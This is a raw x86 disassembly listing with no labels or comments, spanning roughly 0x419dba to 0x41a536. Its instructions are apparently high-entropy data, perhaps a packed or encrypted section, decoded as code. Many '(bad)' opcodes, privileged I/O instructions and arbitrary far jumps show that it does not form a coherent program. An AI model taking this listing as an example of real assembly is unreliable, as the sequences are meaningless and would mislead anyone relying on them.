  419dba:	mov    WORD PTR [ecx-0x7ee3b475],ds
  419dc0:	cwde   
  419dc1:	jmp    0x419db5
  419dc3:	mov    dh,0x8d
  419dc5:	push   0xffffff83
  419dc7:	imul   esp,DWORD PTR [eax-0x54],0x8
  419dcb:	adc    DWORD PTR [eax],ebp
  419dcd:	sbb    eax,0x5cf9726d
  419dd2:	nop
  419dd3:	mov    dh,0xac
  419dd5:	data16 mov ch,0x94
  419dd8:	shr    BYTE PTR [esp+ecx*1],0xe8
  419ddc:	jg     0x419d8d
  419dde:	inc    ebx
  419ddf:	sti    
  419de0:	ret    0x935c
  419de3:	push   ss
  419de4:	mov    ss,WORD PTR [ecx-0x799866af]
  419dea:	cs cdq 
  419dec:	lods   eax,DWORD PTR ds:[esi]
  419ded:	ror    BYTE PTR [edx],0x66
  419df0:	pop    ebx
  419df1:	out    dx,al
  419df2:	(bad)
  419df5:	mov    al,ds:0xb751fc3e
  419dfa:	mov    eax,0xc9af38ae
  419dff:	pop    eax
  419e00:	imul   eax,DWORD PTR [esi+0x17],0x175445bb
  419e07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e08:	bound  eax,QWORD PTR [esi+eiz*2+0x27]
  419e0c:	mov    bh,0xa7
  419e0e:	retf   
  419e0f:	mul    ebp
  419e11:	push   0xffffffc6
  419e13:	jl     0x419e12
  419e15:	scas   al,BYTE PTR es:[edi]
  419e16:	retf   
  419e17:	dec    edx
  419e18:	or     BYTE PTR [ebx+edi*8],0x53
  419e1c:	add    eax,0xb5d398d7
  419e21:	mov    edi,0x385f74e
  419e26:	xchg   edx,eax
  419e27:	or     esi,DWORD PTR [eax]
  419e29:	jg     0x419eaa
  419e2b:	into   
  419e2c:	out    dx,eax
  419e2d:	rcl    BYTE PTR [esi-0x60],0xd6
  419e31:	jge    0x419e72
  419e33:	sub    eax,0x120d691c
  419e38:	stc    
  419e39:	xor    ebx,ecx
  419e3b:	push   ss
  419e3c:	bound  edx,QWORD PTR [esp+ecx*4+0xd]
  419e40:	sub    ebp,DWORD PTR [eax+0x511b2d09]
  419e46:	inc    ebp
  419e47:	xchg   ebx,eax
  419e48:	pop    ebx
  419e49:	pop    ss
  419e4a:	mov    eax,ds:0x416ac8b6
  419e4f:	clc    
  419e50:	jl     0x419ea5
  419e52:	jle    0x419e50
  419e54:	push   ecx
  419e55:	mov    ds:0xaa92fd69,al
  419e5a:	out    0xae,al
  419e5c:	cli    
  419e5d:	push   edi
  419e5e:	push   es
  419e5f:	sbb    BYTE PTR [ebx],cl
  419e61:	or     al,0x22
  419e63:	pusha  
  419e64:	inc    edi
  419e65:	test   al,0x5e
  419e67:	sti    
  419e68:	xor    eax,0x3ca7bb98
  419e6d:	rcr    dh,1
  419e6f:	retf   0x65a8
  419e72:	fwait
  419e73:	jne    0x419e56
  419e75:	retf   0x4aec
  419e78:	xchg   ecx,ecx
  419e7a:	in     al,dx
  419e7b:	lods   eax,DWORD PTR ds:[esi]
  419e7c:	and    eax,0x24113f02
  419e81:	sbb    BYTE PTR [esi+0x32e3fb05],bl
  419e87:	adc    BYTE PTR [ebp-0x2b],ch
  419e8a:	test   eax,0x8da16869
  419e8f:	adc    al,0x4
  419e91:	je     0x419e93
  419e93:	daa    
  419e94:	jp     0x419ed5
  419e96:	or     esp,DWORD PTR [ebx-0x3f4583c6]
  419e9c:	jne    0x419ee1
  419e9e:	jmp    0x5ec4:0x2457fe57
  419ea5:	push   0xffffffd5
  419ea7:	sub    al,0x27
  419ea9:	icebp  
  419eaa:	sub    BYTE PTR [eax],0xcf
  419ead:	mov    al,0xbf
  419eaf:	jle    0x419e95
  419eb1:	sti    
  419eb2:	dec    ecx
  419eb3:	mov    ebx,0x121e8f78
  419eb8:	sub    DWORD PTR [ecx+0x14],0xffffff89
  419ebc:	mov    edx,0xfe20745d
  419ec1:	(bad)  
  419ec2:	pop    eax
  419ec3:	add    eax,0x1c0f9f44
  419ec8:	add    ebx,DWORD PTR [edi-0x199cdd67]
  419ece:	shl    edx,1
  419ed0:	gs pop esp
  419ed2:	ss push 0xdb7212b8
  419ed8:	dec    eax
  419ed9:	xchg   ecx,eax
  419eda:	sub    al,0x65
  419edc:	mov    ds:0x7a39895c,eax
  419ee1:	retf   0x2fcd
  419ee4:	mov    eax,0xd42d434d
  419ee9:	adc    eax,0x9e32cc21
  419eee:	ins    BYTE PTR es:[edi],dx
  419eef:	push   ecx
  419ef0:	sbb    ah,al
  419ef2:	sub    ch,cl
  419ef4:	retf   
  419ef5:	das    
  419ef6:	scas   eax,DWORD PTR es:[edi]
  419ef7:	jmp    0x75f96682
  419efc:	pop    esp
  419efd:	mov    al,ds:0xa323e58e
  419f02:	paddq  mm2,QWORD PTR [edi+0x77]
  419f06:	addr16 cmc 
  419f08:	mov    edi,0xe85b8198
  419f0d:	sub    BYTE PTR [ecx+0x12c572c],dh
  419f13:	fsub   st(2),st
  419f15:	fxch   st(3)
  419f17:	js     0x419f38
  419f19:	or     dh,BYTE PTR [ebx]
  419f1b:	push   esi
  419f1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f1d:	retf   
  419f1e:	push   ebp
  419f1f:	aaa    
  419f20:	out    dx,al
  419f21:	adc    al,0xfc
  419f23:	cmp    eax,0xd8137ce1
  419f28:	or     eax,0xf64d7059
  419f2d:	fwait
  419f2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f2f:	ret    
  419f30:	push   eax
  419f31:	dec    ecx
  419f32:	mov    BYTE PTR [edx-0x3a],dl
  419f35:	aaa    
  419f36:	sar    DWORD PTR [edx],1
  419f38:	sub    esi,edx
  419f3a:	nop
  419f3b:	fcmovnu st,st(3)
  419f3d:	jne    0x419f74
  419f3f:	jmp    0x714e:0x3075cdd3
  419f46:	cmp    edi,eax
  419f48:	add    BYTE PTR [edi],0xa3
  419f4b:	and    al,0x9e
  419f4d:	fld    st(5)
  419f4f:	dec    edx
  419f50:	scas   al,BYTE PTR es:[edi]
  419f51:	sub    ch,BYTE PTR [ebx-0x47a671f7]
  419f57:	mov    bl,BYTE PTR [ebp-0x4cb2a8da]
  419f5d:	aad    0xf4
  419f5f:	xor    eax,0x348a916e
  419f64:	sbb    al,0x1e
  419f66:	inc    edi
  419f67:	out    dx,al
  419f68:	or     al,0x23
  419f6a:	(bad)  
  419f6b:	fimul  WORD PTR [ebp+0x6e]
  419f6e:	clc    
  419f6f:	ins    BYTE PTR es:[edi],dx
  419f70:	and    BYTE PTR [eax+0x3afd61e],al
  419f76:	push   edi
  419f77:	push   esp
  419f78:	jmp    0xc1a:0xd9bbd539
  419f7f:	int3   
  419f80:	ret    
  419f81:	cmp    eax,DWORD PTR [edi+esi*2]
  419f84:	xlat   BYTE PTR ds:[ebx]
  419f85:	pop    edi
  419f86:	sbb    al,0x97
  419f88:	popa   
  419f89:	lahf   
  419f8a:	xchg   esi,eax
  419f8b:	mov    edi,0xaf498055
  419f90:	fdivr  QWORD PTR [edi]
  419f92:	(bad)  
  419f93:	mov    eax,0x653684d3
  419f98:	shr    ah,1
  419f9a:	fwait
  419f9b:	push   cs
  419f9c:	ficom  WORD PTR [eax]
  419f9e:	mov    DWORD PTR [edi+0x4e507b3f],ebx
  419fa4:	mov    edi,0x69390e69
  419fa9:	pop    ss
  419faa:	adc    eax,0x17e5b739
  419faf:	mov    ecx,0x1c812115
  419fb4:	dec    esi
  419fb5:	xchg   esi,eax
  419fb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fb7:	pushf  
  419fb8:	push   ss
  419fb9:	inc    ebp
  419fba:	pusha  
  419fbb:	cwde   
  419fbc:	push   es
  419fbd:	cmp    BYTE PTR [ebx-0x422bc105],bh
  419fc3:	cs bnd jg 0x419f51
  419fc7:	jae    0x419f87
  419fc9:	pusha  
  419fca:	adc    al,0x6e
  419fcc:	xchg   ebx,eax
  419fcd:	dec    esp
  419fce:	leave  
  419fcf:	or     al,0x16
  419fd1:	stc    
  419fd2:	js     0x41a02f
  419fd4:	mov    esi,0xd9c34f87
  419fd9:	out    dx,al
  419fda:	mov    edi,esi
  419fdc:	nop
  419fdd:	pop    eax
  419fde:	(bad)  
  419fdf:	loopne 0x419ff2
  419fe1:	scas   eax,DWORD PTR es:[edi]
  419fe2:	popa   
  419fe3:	push   0x4ada3490
  419fe8:	xlat   BYTE PTR ds:[ebx]
  419fe9:	enter  0x8bdf,0x4e
  419fed:	out    dx,al
  419fee:	mov    ebp,0x3f67ef29
  419ff3:	shr    BYTE PTR [edx+0x10],1
  419ff6:	pop    ebp
  419ff7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ff8:	pushf  
  419ff9:	hlt    
  419ffa:	inc    edx
  419ffb:	mov    bh,BYTE PTR [ecx]
  419ffd:	rcr    DWORD PTR [edx-0x7c],0x2e
  41a001:	test   BYTE PTR ds:0x6522a586,ch
  41a007:	jecxz  0x419fda
  41a009:	enter  0x9f2f,0x5d
  41a00d:	adc    DWORD PTR [ecx+esi*1-0x15],esp
  41a011:	int    0xb1
  41a013:	and    DWORD PTR [esi-0x54aeb340],ebp
  41a019:	out    0x1a,al
  41a01b:	add    ch,BYTE PTR [edx]
  41a01d:	retf   0x7c69
  41a020:	loopne 0x419fdf
  41a022:	sbb    DWORD PTR [ecx],0xcaae18a5
  41a028:	cld    
  41a029:	or     BYTE PTR [ecx+0x7b83e264],ah
  41a02f:	(bad)  
  41a030:	aad    0x12
  41a032:	xor    al,0x99
  41a034:	push   edx
  41a035:	ss cs stos BYTE PTR es:[edi],al
  41a038:	ss cdq 
  41a03a:	pop    edx
  41a03b:	jno    0x41a082
  41a03d:	inc    edx
  41a03e:	pop    ss
  41a03f:	mov    ebp,DWORD PTR [ebp+ecx*8+0x51431e41]
  41a046:	push   eax
  41a047:	jnp    0x419fea
  41a049:	leave  
  41a04a:	test   ch,cl
  41a04c:	inc    ebp
  41a04d:	retf   0xc4cd
  41a050:	shr    al,1
  41a052:	or     eax,0x55f95724
  41a057:	adc    eax,0xdbaf6eb1
  41a05c:	cwde   
  41a05d:	xchg   edi,eax
  41a05e:	jmp    0x41a066
  41a060:	jno    0x41a0dc
  41a062:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41a064:	mov    al,0xd4
  41a066:	push   ss
  41a067:	sar    DWORD PTR [edx],0x89
  41a06a:	jecxz  0x41a008
  41a06c:	xor    BYTE PTR [esi+edi*8-0x3b],ch
  41a070:	sub    DWORD PTR [edx-0x3c2dd666],edx
  41a076:	mov    cl,0x24
  41a078:	or     DWORD PTR [esi+eiz*2-0x37381e2c],esp
  41a07f:	pop    edi
  41a080:	inc    ebx
  41a081:	mov    al,ds:0x13c616a6
  41a086:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a087:	daa    
  41a088:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a08a:	cmp    DWORD PTR [esi-0x47],edx
  41a08d:	mov    DWORD PTR [ecx+edx*4],ecx
  41a090:	or     BYTE PTR [edi-0x6e],bh
  41a093:	retf   
  41a094:	mov    bh,0x16
  41a096:	loop   0x41a0fb
  41a098:	(bad)  
  41a099:	retf   
  41a09a:	dec    eax
  41a09b:	add    cl,BYTE PTR [ebp+0x59]
  41a09e:	popf   
  41a09f:	lock adc BYTE PTR [ebp+0x4c],dh
  41a0a3:	cmp    esp,ecx
  41a0a5:	or     al,0xb9
  41a0a7:	in     eax,0x86
  41a0a9:	add    edx,DWORD PTR [eax+0x7330cd1a]
  41a0af:	sub    DWORD PTR [ebp-0x1],0xc393345d
  41a0b6:	jne    0x41a09f
  41a0b8:	inc    bh
  41a0ba:	fiadd  WORD PTR [ebx+0x3a3ad7]
  41a0c0:	mov    al,0x3f
  41a0c2:	dec    edx
  41a0c3:	add    BYTE PTR [eax-0x2f],bh
  41a0c6:	ja     0x41a07d
  41a0c8:	aam    0xc8
  41a0ca:	sub    eax,0x64892d78
  41a0cf:	adc    BYTE PTR [eax],al
  41a0d1:	dec    ebx
  41a0d2:	pop    esp
  41a0d3:	fisub  DWORD PTR [edi+0x757575f8]
  41a0d9:	int3   
  41a0da:	xchg   ebx,eax
  41a0db:	movaps xmm6,xmm6
  41a0de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0df:	cmp    ah,BYTE PTR [esi+0x3f9a0d40]
  41a0e5:	je     0x41a166
  41a0e7:	adc    ch,ah
  41a0e9:	dec    BYTE PTR [ebx-0x161976d9]
  41a0ef:	push   edx
  41a0f0:	sub    eax,DWORD PTR [edi-0x5f]
  41a0f3:	data16 jae 0x41a0fe
  41a0f6:	cdq    
  41a0f7:	(bad)  
  41a0f8:	sahf   
  41a0f9:	xor    DWORD PTR [esi-0x7cc09cd0],ebp
  41a0ff:	inc    edi
  41a100:	dec    ebp
  41a101:	(bad)  [eax-0x169f2f64]
  41a107:	jae    0x41a0b4
  41a109:	loop   0x41a14f
  41a10b:	(bad)  
  41a10c:	into   
  41a10d:	lods   al,BYTE PTR ds:[esi]
  41a10e:	dec    ebx
  41a10f:	sbb    eax,0x5043a43
  41a114:	or     al,ah
  41a116:	shl    BYTE PTR [edx+0x3ddb090d],cl
  41a11c:	sub    ah,BYTE PTR [ecx+0x76]
  41a11f:	sub    esp,DWORD PTR [ebx]
  41a121:	or     dl,BYTE PTR [ebp+0x1025bc6a]
  41a127:	(bad)  
  41a128:	adc    BYTE PTR [ebx],ah
  41a12a:	in     al,0xac
  41a12c:	cmc    
  41a12d:	xchg   ecx,eax
  41a12e:	out    dx,al
  41a12f:	adc    ch,BYTE PTR [eax+0xf]
  41a132:	mov    bh,0x11
  41a134:	sub    DWORD PTR [ecx],0xffffff9a
  41a137:	(bad)  
  41a138:	(bad)  
  41a139:	aas    
  41a13a:	mov    edx,0x9aeb8790
  41a13f:	push   eax
  41a140:	jge    0x41a0c2
  41a142:	sbb    dl,cl
  41a144:	retf   0xb54e
  41a147:	xor    esi,DWORD PTR [edi]
  41a149:	dec    edx
  41a14a:	stos   DWORD PTR es:[edi],eax
  41a14b:	je     0x41a0e8
  41a14d:	cdq    
  41a14e:	aaa    
  41a14f:	pop    ss
  41a150:	pop    eax
  41a151:	mov    ch,BYTE PTR [eax-0x31]
  41a154:	stos   DWORD PTR es:[edi],eax
  41a155:	rcr    ecx,0x89
  41a158:	nop
  41a159:	inc    edx
  41a15a:	jp     0x41a10f
  41a15c:	retf   
  41a15d:	je     0x41a171
  41a15f:	in     al,0x36
  41a161:	bound  edi,QWORD PTR [edi+0x68]
  41a164:	jge    0x41a1b6
  41a166:	repnz and al,dl
  41a169:	ret    
  41a16a:	sub    ch,dl
  41a16c:	lock pop esi
  41a16e:	fwait
  41a16f:	pop    edi
  41a170:	mov    ebp,DWORD PTR [bp-0x3762]
  41a175:	imul   ebp
  41a177:	(bad)  
  41a178:	fsub   st(0),st
  41a17a:	or     DWORD PTR [esi+0x5980b0c8],0xfcc66723
  41a184:	test   BYTE PTR [ebp+0x41a57ae1],bh
  41a18a:	xor    ah,ch
  41a18c:	ror    BYTE PTR [ebx-0x5afce4ed],cl
  41a192:	sub    al,0x40
  41a194:	pop    ds
  41a195:	pop    edi
  41a196:	dec    esi
  41a197:	cmp    bl,dl
  41a199:	xlat   BYTE PTR ds:[ebx]
  41a19a:	jb     0x41a186
  41a19c:	push   esi
  41a19e:	inc    ebx
  41a19f:	imul   ebp,DWORD PTR [edi],0xffffffae
  41a1a2:	sti    
  41a1a3:	lods   al,BYTE PTR ds:[esi]
  41a1a4:	and    al,0x61
  41a1a6:	test   DWORD PTR [ecx+0x3d],edx
  41a1a9:	scas   eax,DWORD PTR es:[edi]
  41a1aa:	lods   eax,DWORD PTR ds:[esi]
  41a1ab:	test   BYTE PTR [eax],bl
  41a1ad:	int    0x90
  41a1af:	sysexit 
  41a1b1:	cmp    BYTE PTR [ebx+0x5d],cl
  41a1b4:	xor    DWORD PTR [ebx],esp
  41a1b6:	sbb    esp,ebx
  41a1b8:	jp     0x41a1d4
  41a1ba:	adc    ah,BYTE PTR [edi+0x6c]
  41a1bd:	jmp    0xb767f5d5
  41a1c2:	jae    0x41a1a3
  41a1c4:	pop    ecx
  41a1c5:	sti    
  41a1c6:	loope  0x41a16e
  41a1c8:	cmp    ebp,ebp
  41a1ca:	adc    esi,0x28
  41a1cd:	push   edi
  41a1ce:	xor    BYTE PTR ds:0x42f81245,ch
  41a1d4:	push   edx
  41a1d5:	or     edi,DWORD PTR [eax-0x3c]
  41a1d8:	xchg   DWORD PTR [eax+esi*2],ecx
  41a1db:	stos   DWORD PTR es:[edi],eax
  41a1dc:	test   BYTE PTR [ebp+0x70],cl
  41a1df:	mov    ds:0xdf2d83e9,al
  41a1e4:	(bad)  
  41a1e5:	addr16 dec ebx
  41a1e7:	ins    BYTE PTR es:[edi],dx
  41a1e8:	mov    al,dl
  41a1ea:	inc    BYTE PTR [ebp+0x21660cdb]
  41a1f0:	ror    al,0x99
  41a1f3:	or     BYTE PTR [esi-0x46d0c564],al
  41a1f9:	push   ds
  41a1fa:	or     bl,BYTE PTR [esi]
  41a1fc:	mov    edi,DWORD PTR [eax+0x2c58d82c]
  41a202:	mov    bl,0x37
  41a204:	sub    BYTE PTR ds:0x31a732f8,dh
  41a20a:	int3   
  41a20b:	xchg   ecx,eax
  41a20c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a20d:	and    DWORD PTR [edi+0x3daf2164],esi
  41a213:	mov    ds:0xd626b622,al
  41a218:	push   ds
  41a219:	adc    al,0xd1
  41a21b:	fwait
  41a21c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a21d:	pop    es
  41a21e:	inc    esp
  41a21f:	inc    esi
  41a220:	jne    0x41a29b
  41a222:	enter  0xf36d,0x61
  41a226:	das    
  41a227:	addr16 iret 
  41a229:	dec    esp
  41a22a:	and    eax,ecx
  41a22c:	adc    bh,BYTE PTR [edi]
  41a22e:	dec    ecx
  41a22f:	and    esi,0x9155a05
  41a235:	jecxz  0x41a27c
  41a237:	stos   BYTE PTR es:[edi],al
  41a238:	dec    ebp
  41a239:	mov    bh,0xca
  41a23b:	add    eax,0x19f57488
  41a240:	clc    
  41a241:	lock inc edx
  41a243:	cmp    BYTE PTR es:[ebp-0x7e25a762],dh
  41a24a:	mov    edx,0x3b9b2bb8
  41a24f:	mov    esp,0x229c2697
  41a254:	lea    esp,[esi-0x33f5ca0c]
  41a25a:	ins    BYTE PTR es:[edi],dx
  41a25b:	sbb    ch,BYTE PTR [ecx]
  41a25d:	or     al,0x9d
  41a25f:	bound  edi,QWORD PTR [ecx+0x5950869d]
  41a265:	sbb    eax,0x112683c6
  41a26a:	ret    
  41a26b:	inc    edx
  41a26c:	push   esp
  41a26d:	and    BYTE PTR gs:0xb992414c,al
  41a274:	xor    dh,dl
  41a276:	dec    ecx
  41a277:	inc    edi
  41a278:	mov    edx,0x51719688
  41a27d:	ror    BYTE PTR [edx+0x7b9efe31],cl
  41a283:	test   eax,0xc812d797
  41a288:	mov    BYTE PTR [edx+0x6d93a02b],bl
  41a28e:	dec    esp
  41a28f:	mov    eax,0x588ab993
  41a294:	(bad)  
  41a295:	ds aad 0x98
  41a298:	dec    edi
  41a299:	mov    ecx,ebp
  41a29b:	mov    DWORD PTR [edi],ebp
  41a29d:	mov    eax,0xd7729a71
  41a2a2:	fist   WORD PTR [edi+0x1a]
  41a2a5:	inc    ebp
  41a2a6:	or     esp,DWORD PTR [eax+0x575edf08]
  41a2ac:	mov    esi,0x62fa8fa2
  41a2b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2b2:	cmp    BYTE PTR [esi-0x6d69eda8],0x53
  41a2b9:	mov    fs,WORD PTR [edi-0x2f099f35]
  41a2bf:	gs adc eax,0xb3be8963
  41a2c5:	dec    edx
  41a2c6:	int    0x5f
  41a2c8:	sbb    al,0xd4
  41a2ca:	fisttp DWORD PTR [ebp-0x34db737b]
  41a2d0:	xchg   ebx,eax
  41a2d1:	or     al,0xa5
  41a2d3:	dec    ebx
  41a2d4:	or     BYTE PTR ds:0x1367bf25,al
  41a2da:	push   ecx
  41a2db:	test   eax,0xce305d90
  41a2e0:	aad    0x93
  41a2e2:	mov    ah,0x9d
  41a2e4:	fiadd  WORD PTR [esi+0x77898fac]
  41a2ea:	xor    ch,BYTE PTR [edi+0x3a284021]
  41a2f0:	rol    DWORD PTR [ebx-0x43a090d5],1
  41a2f6:	push   edi
  41a2f7:	sub    edi,esp
  41a2f9:	es aaa 
  41a2fb:	jnp    0x41a357
  41a2fd:	jle    0x41a35c
  41a2ff:	imul   esp,DWORD PTR [esi+0x26],0x45a899a5
  41a306:	pusha  
  41a307:	adc    ecx,DWORD PTR [ecx]
  41a309:	lods   al,BYTE PTR ds:[esi]
  41a30a:	nop
  41a30b:	leave  
  41a30c:	jo     0x41a344
  41a30e:	sub    BYTE PTR ds:0x6c8b4216,bh
  41a314:	mov    eax,ds:0xc05c2d5b
  41a319:	mov    BYTE PTR ds:0xd808915,ah
  41a31f:	xchg   esi,eax
  41a320:	outs   dx,DWORD PTR ds:[esi]
  41a321:	call   0xca1ad4ad
  41a326:	sub    eax,0x99dd0c29
  41a32b:	pop    ds
  41a32c:	mov    dh,0x80
  41a32e:	jo     0x41a2b0
  41a330:	nop
  41a331:	loopne 0x41a2c8
  41a333:	xchg   ebx,eax
  41a334:	cmp    al,0xd7
  41a336:	mov    eax,ds:0x65ac5b07
  41a33b:	outs   dx,BYTE PTR ds:[esi]
  41a33c:	lahf   
  41a33d:	mov    DWORD PTR [edi-0x4772eaef],ecx
  41a343:	adc    BYTE PTR [edx-0x19],dl
  41a346:	adc    al,0x4d
  41a348:	fmulp  st(5),st
  41a34a:	ret    
  41a34b:	lahf   
  41a34c:	sub    BYTE PTR [edi],al
  41a34e:	pop    edi
  41a34f:	adc    DWORD PTR [edi],ebx
  41a351:	dec    ebp
  41a352:	cmc    
  41a353:	push   es
  41a354:	aad    0xca
  41a356:	cmp    al,0x29
  41a358:	mov    ch,0x3d
  41a35a:	mov    ebp,0x548e6e22
  41a35f:	mov    bh,0x47
  41a361:	into   
  41a362:	test   ecx,ecx
  41a364:	mov    ds:0x4b7ae10f,al
  41a369:	rcl    DWORD PTR [ebp-0x3143ecca],1
  41a36f:	mov    esi,0xd81b5234
  41a374:	xor    ebp,DWORD PTR [ecx+edi*1]
  41a377:	inc    BYTE PTR [eax+esi*2]
  41a37a:	out    dx,eax
  41a37b:	cmp    DWORD PTR [esi-0x15],eax
  41a37e:	mov    ecx,0x15d8c870
  41a383:	mov    bl,0x11
  41a385:	imul   ecx,DWORD PTR cs:[edx],0x866860be
  41a38c:	push   0x2f
  41a38e:	(bad)  
  41a38f:	in     al,0x29
  41a391:	push   ds
  41a392:	or     BYTE PTR [eax+0x6],bh
  41a395:	lods   eax,DWORD PTR ds:[esi]
  41a396:	or     DWORD PTR [ecx+0xd],ebx
  41a399:	xchg   edi,eax
  41a39a:	clc    
  41a39b:	test   eax,0x478254c9
  41a3a0:	push   ds
  41a3a1:	pop    ecx
  41a3a2:	mov    eax,0x9e291b2b
  41a3a7:	mov    dh,0x6c
  41a3a9:	and    edi,ecx
  41a3ab:	mov    ch,0xe8
  41a3ad:	std    
  41a3ae:	mov    ebx,DWORD PTR [esi-0x3b9c6e4a]
  41a3b4:	push   eax
  41a3b5:	xchg   edx,eax
  41a3b6:	jb     0x41a3cc
  41a3b8:	mov    dh,cl
  41a3ba:	into   
  41a3bb:	(bad)  
  41a3bc:	std    
  41a3bd:	xchg   ecx,eax
  41a3be:	and    cl,BYTE PTR cs:[esi-0x24]
  41a3c2:	hlt    
  41a3c3:	cwde   
  41a3c4:	dec    ebx
  41a3c5:	or     al,0xb6
  41a3c7:	jo     0x41a375
  41a3c9:	dec    ecx
  41a3ca:	sub    al,0x6c
  41a3cc:	jg     0x41a438
  41a3ce:	xchg   BYTE PTR [ebp+0x6b843f60],dh
  41a3d4:	hlt    
  41a3d5:	sub    al,dh
  41a3d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3d8:	sahf   
  41a3d9:	scas   al,BYTE PTR es:[edi]
  41a3da:	inc    edx
  41a3db:	push   ss
  41a3dc:	sbb    al,0xdc
  41a3de:	pop    ebp
  41a3df:	mov    bh,0xd3
  41a3e1:	mov    ah,0xf8
  41a3e3:	xor    edi,DWORD PTR [esi+0x144c4588]
  41a3e9:	fnstcw WORD PTR [ebx+eax*2-0x499814e2]
  41a3f0:	lea    ebx,[edx-0x52e7bdeb]
  41a3f6:	add    BYTE PTR [edx+0x71],ah
  41a3f9:	out    0x20,eax
  41a3fb:	mov    edx,0x8cd22214
  41a400:	sar    ah,1
  41a402:	inc    edi
  41a403:	cdq    
  41a404:	add    DWORD PTR [ebp+0x310cc0b0],eax
  41a40a:	mov    BYTE PTR [edi],ah
  41a40c:	inc    esi
  41a40d:	out    0x31,al
  41a40f:	dec    ebp
  41a410:	js     0x41a3fa
  41a412:	jge    0x41a407
  41a414:	jge    0x41a476
  41a416:	into   
  41a417:	stos   DWORD PTR es:[edi],eax
  41a418:	xchg   ebp,esp
  41a41a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a41b:	(bad)  
  41a41d:	mov    cl,0xcc
  41a41f:	int3   
  41a420:	jno    0x41a41e
  41a422:	sbb    edi,DWORD PTR [ecx+0x14a1ab5]
  41a428:	sub    eax,0xb600a096
  41a42d:	push   ebx
  41a42e:	push   esi
  41a42f:	fs (bad) 
  41a431:	or     edx,DWORD PTR [edx+0x67b5a0d8]
  41a437:	int3   
  41a438:	fsub   QWORD PTR [edx]
  41a43a:	scas   al,BYTE PTR es:[edi]
  41a43b:	ja     0x41a3ef
  41a43d:	jmp    0x41a3cc
  41a43f:	jbe    0x41a40f
  41a441:	es push 0x4da82bef
  41a447:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a448:	sar    BYTE PTR [ecx+0x2d],0xc0
  41a44c:	daa    
  41a44d:	mov    cl,0x88
  41a44f:	loopne 0x41a420
  41a451:	inc    esi
  41a452:	scas   al,BYTE PTR es:[edi]
  41a453:	pop    eax
  41a454:	inc    ecx
  41a455:	mov    cl,ch
  41a457:	das    
  41a458:	loope  0x41a3f8
  41a45a:	enter  0x6036,0x84
  41a45e:	rol    BYTE PTR [ebp+edi*4+0x51],0x19
  41a463:	rcr    DWORD PTR [ebx-0x1c],0xd1
  41a467:	adc    BYTE PTR [esi],0x6
  41a46a:	das    
  41a46b:	sub    bh,cl
  41a46d:	(bad)  
  41a46e:	mov    esp,0xb117bc20
  41a473:	fcmovbe st,st(7)
  41a475:	enter  0x806c,0xf5
  41a479:	inc    eax
  41a47a:	mov    al,ds:0x60cef8f3
  41a47f:	mov    eax,ds:0x77c75c40
  41a484:	std    
  41a485:	test   BYTE PTR [eax+0x333b691a],bl
  41a48b:	cmc    
  41a48c:	scas   al,BYTE PTR es:[edi]
  41a48d:	or     eax,0xc661b296
  41a492:	mov    bh,0x9
  41a494:	popa   
  41a495:	xchg   esp,eax
  41a496:	lea    ebx,[esp+eax*2]
  41a499:	popa   
  41a49a:	pop    ebx
  41a49b:	fs (bad) 
  41a49d:	int3   
  41a49e:	lods   eax,DWORD PTR ds:[esi]
  41a49f:	adc    eax,0xd79f9337
  41a4a4:	inc    ecx
  41a4a5:	test   BYTE PTR [edi+0x62],ch
  41a4a8:	mov    ch,0x39
  41a4aa:	nop
  41a4ab:	inc    ecx
  41a4ac:	or     DWORD PTR [ebx-0x25],ecx
  41a4af:	pusha  
  41a4b0:	scas   eax,DWORD PTR es:[edi]
  41a4b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4b2:	jecxz  0x41a4f6
  41a4b4:	mov    al,ds:0x67e4772b
  41a4b9:	dec    ebp
  41a4ba:	mov    edx,0xbef90482
  41a4bf:	and    eax,0x99462707
  41a4c4:	ins    DWORD PTR es:[edi],dx
  41a4c5:	shr    DWORD PTR [ecx+0x638f1184],0xf9
  41a4cc:	inc    esi
  41a4cd:	out    0x24,eax
  41a4cf:	jecxz  0x41a50e
  41a4d1:	aas    
  41a4d2:	imul   ebp,ebp,0x2c1572f3
  41a4d8:	cmp    al,0xa5
  41a4da:	xor    dl,BYTE PTR [ebp-0x6b]
  41a4dd:	inc    esi
  41a4de:	inc    edx
  41a4df:	xor    DWORD PTR [eax+0x30],edx
  41a4e2:	jecxz  0x41a524
  41a4e4:	mov    ch,0x1d
  41a4e6:	int3   
  41a4e7:	mov    ds,ebx
  41a4e9:	jp     0x41a53f
  41a4eb:	std    
  41a4ec:	or     eax,0x60e4b2c2
  41a4f1:	jp     0x41a512
  41a4f3:	shl    DWORD PTR [ebx-0x1b],0x87
  41a4f7:	fwait
  41a4f8:	and    bh,cl
  41a4fa:	jl     0x41a538
  41a4fc:	push   esi
  41a4fd:	mov    edi,0x84e49878
  41a502:	fwait
  41a503:	stos   BYTE PTR es:[edi],al
  41a504:	jmp    0x8472:0x9ee24931
  41a50b:	or     ebp,DWORD PTR [edi+ebp*1+0x656481ad]
  41a512:	je     0x41a4f5
  41a514:	or     ecx,esi
  41a516:	pop    ebx
  41a517:	push   ebx
  41a518:	adc    BYTE PTR [ebx-0x32],bl
  41a51b:	sbb    BYTE PTR ds:0xe49bba5a,ch
  41a521:	jecxz  0x41a509
  41a523:	pop    ebx
  41a524:	xor    al,al
  41a526:	sub    BYTE PTR [esp+ebp*1-0x7eecaa86],bh
  41a52d:	jmp    0x41a4d9
  41a52f:	ret    0x644f
  41a532:	loope  0x41a587
  41a534:	pop    ebx
  41a535:	pop    edx
  41a536:	stos   BYTE PTR es:[edi],al
